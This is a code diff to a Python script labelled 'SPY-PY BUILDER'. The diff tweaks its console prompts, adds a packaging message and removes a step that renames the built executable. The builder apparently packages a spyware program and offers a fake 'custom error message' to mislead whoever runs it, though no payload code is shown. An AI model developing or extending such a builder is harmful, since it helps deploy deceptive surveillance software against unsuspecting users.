@@ -118,7 +118,7 @@ def prepare_source():
                 break
 
         exe_name = input("[SPY-PY BUILDER] Enter the desired name of the executable: ").strip()
-        software_dir_name = input(f"Specify the name of the directory where the software will be stored (DEFAULT: {exe_name}): ").strip()
+        software_dir_name = input(f"[SPY-PY BUILDER] Specify the name of the directory where the software will be stored (DEFAULT: {exe_name}): ").strip()
         choice = input("[SPY-PY BUILDER] Would you like to display a custom error message? (yes/no): ").strip().lower()
         custom_error_message = ""
         if choice == "yes":
@@ -162,7 +162,7 @@ def pack_source(exe_name):
     global ERROR_OCCURRED
     try:
         os.rename("spy-py-temp/prepared.py", f"spy-py-temp/{exe_name}.py")
-       
+        print("[SPY-PY BUILDER] [INFO] Packaging executable...")
         if platform.system() == "Windows":
             venv_activate_command = "Spy-Py\\Scripts\\activate"
         else:
@@ -182,13 +182,6 @@ def pack_source(exe_name):
         ERROR_OCCURRED = True
         return
     print("[SPY-PY BUILDER] [INFO] Packaging executable completed successfully.")
-    try:
-        file = os.listdir("dist")[0]
-        os.rename(f"dist/{file}", f"dist/{exe_name}")
-    except Exception as e:
-        print(f"[SPY-PY BUILDER] [ERROR] An error occurred while renaming the executable: {e}")
-        print("[SPY-PY BUILDER] [ERROR] Please try again or check the build process.")
-        ERROR_OCCURRED = True
 
 def cleanup(exe_name):
     global ERROR_OCCURRED
